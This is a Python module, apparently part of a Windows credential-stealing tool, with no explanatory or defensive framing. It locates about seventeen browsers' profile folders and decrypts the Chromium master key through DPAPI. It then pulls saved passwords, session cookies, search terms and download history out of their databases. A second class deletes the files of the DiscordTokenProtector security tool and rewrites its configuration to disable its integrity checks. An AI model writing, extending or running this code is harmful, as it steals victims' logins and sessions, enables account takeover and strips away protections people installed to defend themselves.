import os
import json
import base64
import win32crypt
import sqlite3
import shutil

from core.components import utils

from Crypto.Cipher import AES

local = os.environ["localappdata"]
roaming = os.environ["appdata"]
temp = os.environ["temp"]

browsers = {
    'Opera': roaming + '\\Opera Software\\Opera Stable',
    'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
    'Amigo': local + '\\Amigo\\User Data',
    'Torch': local + '\\Torch\\User Data',
    'Kometa': local + '\\Kometa\\User Data',
    'Orbitum': local + '\\Orbitum\\User Data',
    'CentBrowser': local + '\\CentBrowser\\User Data',
    '7Star': local + '\\7Star\\7Star\\User Data',
    'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
    'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
}

browsers_profile = {
    'Vivaldi': local + '\\Vivaldi\\User Data',
    'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data',
    'Yandex': local + '\\Yandex\\YandexBrowser\\User Data',
    'Iridium': local +'\\Iridium\\User Data',
    'Uran': local + '\\uCozMedia\\Uran\\User Data',
    'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data',
    'Chrome': local + "\\Google\\Chrome\\User Data"
}

class Extract:
    def __init__(self, keyPath: str) -> None:
        self.key = self.getKey(keyPath)

    def getKey(self, path: str):
        with open(path, "r") as f:
            localState = json.loads(f.read())
            
            encryptionKey = base64.b64decode(
      localState["os_crypt"]["encrypted_key"])
            encryptionKey = encryptionKey[5:]

        return win32crypt.CryptUnprotectData(encryptionKey, None, None, None, 0)[1]
    
    def decryption(self, password: str, key: bytes):
        try:
            iv = password[3:15]
            password = password[15:]
            
            cipher = AES.new(key, AES.MODE_GCM, iv)
            
            return cipher.decrypt(password)[:-16].decode()
        except:
            
            try:
                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
            except:
                return "No Passwords"
            
    def extractPasswords(self, passwdFile: str):
        passwords = []
        tempfile = utils.random_string.get(10)

        shutil.copyfile(passwdFile, tempfile)
        db = sqlite3.connect(tempfile)
        cursor = db.cursor()

        cursor.execute(
        "select origin_url, action_url, username_value, password_value from logins")

        for row in cursor.fetchall():
            passwords.append({
                "url": row[0],
                "action_url": row[1],
                "username": row[2],
                "password": self.decryption(row[3], self.key)})
            
        cursor.close()
        db.close()

        try: os.remove(tempfile) 
        except: pass

        return passwords
    
    def extractHistory(self, historyFile: str):
        terms = []
        visited = []
        downloads = {}
        history = {"terms": terms, "download": downloads, "visited": visited}

        tempfile = utils.random_string.get(10)
        shutil.copy(historyFile, tempfile)
        db = sqlite3.connect(tempfile)
        cursor = db.cursor()
        cursor.execute("select term from keyword_search_terms")

        for row in cursor.fetchall():
                terms.append(row[0])
        
        cursor.execute("select current_path, tab_url from downloads")
        for row in cursor.fetchall():
                downloads[row[0]] = row[1]

        cursor.execute("select url from downloads_url_chains")
        for row in cursor.fetchall():
                visited.append(row[0])

        cursor.close()
        db.close()

        try: os.remove(tempfile)
        except: pass

        return history
    
    def extractCookies(self, browserPath: str):
        cookies = []
        tempfile = utils.random_string.get(10)
        if os.path.exists(os.path.join(browserPath, "Network")):
            cookiesPath = os.path.join(browserPath, "Network", "Cookies")
        else:
            cookiesPath = os.path.join(browserPath, "Cookies")

        shutil.copy(cookiesPath, tempfile)
        db = sqlite3.connect(tempfile)
        cursor = db.cursor()
        cursor.execute("select host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly, samesite, has_expires from cookies")

        for row in cursor.fetchall():
            cookies.append({"host": row[0],"name": row[1], "value": self.decryption(row[2], self.key), "path": row[3], "expires": row[4], "secure": row[5], "httponly": row[6], "sameSite": row[7], "has_expires": row[8]})

        cursor.close()
        db.close()

        try: os.remove(tempfile)
        except: pass

        return cookies

class Anti_tokenprotector:
    def killprotector():
        path = f"{roaming}\\DiscordTokenProtector\\"
        config = path + "config.json"

        if not os.path.exists(path):
            return

        for process in ["DiscordTokenProtector.exe", "ProtectionPayload.dll", "secure.dat"]:
            try:
                os.remove(path + process)
            except FileNotFoundError:
                pass

        if os.path.exists(config):
            with open(config, errors="ignore") as f:
                try:
                    item = json.load(f)
                except json.decoder.JSONDecodeError:
                    return
                
                item['auto_start'] = False
                item['auto_start_discord'] = False
                item['integrity'] = False
                item['integrity_allowbetterdiscord'] = False
                item['integrity_checkexecutable'] = False
                item['integrity_checkhash'] = False
                item['integrity_checkmodule'] = False
                item['integrity_checkscripts'] = False
                item['integrity_checkresource'] = False
                item['integrity_redownloadhashes'] = False
                item['iterations_iv'] = 364
                item['iterations_key'] = 457
                item['version'] = 69420

            with open(config, 'w') as f:
                json.dump(item, f, indent=2, sort_keys=True)